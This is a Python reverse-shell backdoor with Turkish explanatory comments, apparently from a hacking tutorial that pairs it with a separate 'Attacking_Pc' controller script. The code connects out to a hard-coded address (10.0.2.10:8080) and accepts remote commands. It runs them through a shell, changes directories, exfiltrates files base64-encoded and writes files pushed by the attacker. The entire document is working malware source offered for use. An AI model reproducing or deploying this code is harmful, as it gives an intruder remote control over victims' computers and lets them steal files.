#Bu script'in calisabilmesi icin konu icerisinden Attacking_Pc adli script'in de bulunup gerekli islemlerin yapilmasi lazimdir!!
import socket  # Iki bilgisayar arasinda baglanti kurulmasini saglar
import subprocess
import json
import os
import base64

class Socket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET,
                                           socket.SOCK_STREAM)  # Socket icerisine hangi ag adresi ile calisilacagi ve hangi yolla verilerin transfer edilecegi belirtilir
        self.my_connection.connect((ip,
                                    port))  # Baglanti kurulmasi icin bir IP adresi ve port numarasi gerekir.Connect metodu bu bilgileri bir tuple olarak alir. Bu sebep ile bu bilgiler tuple olarak gonderilmelidir.

    def komut_uygulama(self, command):
        return subprocess.check_output(command, shell=True)  # shell = True degeri bize string halinde cikti verir

    # check_call yerine check_output yazilmasinin sebebi bu degeri alip bir degiskene kaydedip o degiskeni direkt olarak baglanilan cihaza gondermektir.
    # Eger check_call olsaydi direkt olarak komutun degerini verirdi herhangi bir gonderim islemi gerceklesmezdi

    def json_send(self, data):
        json_data = json.dumps(data)
        self.my_connection.send(json_data)

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def cd_command(self, dizin):  # girilen dizine gitmemizi saglar
        os.chdir(dizin)
        return "Cd to " + dizin

    def read_file(self,
                  isim):  # Istedigimiz dosyanin icergini okumamizi saglar.Dosyalari download yapabilmemiz icin gerklidir
        with open(isim,
                  "rb") as my_file:  # rb ile dosyayi binary olarak okuyabiliriz.Bu islem sadece bir txt dosyasi degil jpg dosyasi gibi dosyalari da okumamizi saglar
            return base64.b64encode(my_file.read())  # icinde ozel karakter bulunan dosyalari okuyabilmemizi saglar

    def write_file(self, isim, icerik):  # Dosyalari upload yapabilmemiz icin gereklidir.
        with open(isim, "wb") as my_file:
            my_file.write(base64.b64decode(icerik))
            return "Download ok"

    def start_socket(self):
        while True:  # Programin bir islem yaptiktan sonra kapanmasini engelleyip surekli olarak islem yapilmasini saglamak icin sonsuz donguye alindi.
            command = self.json_receive()  # Baglantidan verileri paket olarak al anlamindadir
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()

                elif command[0] == "cd" and len(command) > 1:  # cd ile gelen komutlari calistirabilmemizi saglar
                    command_output = self.cd_command(command[1])

                elif command[0] == "download":
                    command_output = self.read_file(command[1])

                elif command[0] == "upload":
                    command_output = self.write_file(command[1], command[2])

                else:
                    command_output = self.komut_uygulama(command)
            except Exception:  # Hangi hatayi alirsak alalim programin cokmesini engellemek icin kullanilir
                command_output = "Error!"

            self.json_send(command_output)
        self.my_connection.close()

my_socket_obj = Socket("10.0.2.10", 8080)
my_socket_obj.start_socket()
